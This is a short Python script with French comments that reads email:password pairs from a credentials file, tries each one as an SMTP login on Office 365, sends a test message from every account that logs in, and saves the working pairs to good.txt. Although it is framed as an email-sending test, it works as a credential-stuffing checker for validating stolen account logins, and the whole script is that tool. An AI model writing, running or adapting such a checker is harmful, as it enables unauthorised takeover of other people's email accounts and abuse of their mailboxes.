import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from smtplib import SMTPAuthenticationError

# Paramètres du serveur SMTP
smtp_server = "smtp.office365.com"
smtp_port = 587

# Destinataire et sujet
recipient_email = "destinator@mail.com"
subject = "Test d'envoi d'e-mail depuis Python"

# Corps du message
body = "Ceci est un message de test envoyé depuis Python."

# Fichier pour stocker les informations d'identification valides
good_file = open('good.txt', 'a')

# Lecture des informations d'identification depuis le fichier
with open('credentials.txt', 'r') as file:
    for line in file:
        email, password = line.strip().split(':')

        # Création du message
        message = MIMEMultipart()
        message["From"] = email
        message["To"] = recipient_email
        message["Subject"] = subject

        # Ajout du corps du message
        message.attach(MIMEText(body, "plain"))

        # Tentative de connexion au serveur SMTP
        try:
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                # Démarrer la connexion sécurisée (TLS)
                server.starttls()

                # Authentification
                server.login(email, password)

                # Envoi du message
                server.sendmail(email, recipient_email, message.as_string())

            print(f"E-mail envoyé avec succès depuis {email}.")
            
            # Enregistrement des informations d'identification valides dans good.txt
            good_file.write(f"{email}:{password}\n")
        
        except SMTPAuthenticationError as e:
            print(f"Échec de l'authentification pour {email}. Raison : {e}")
        
        except Exception as e:
            print(f"Une erreur s'est produite pour {email}. Raison : {e}")

# Fermeture du fichier good.txt
good_file.close()
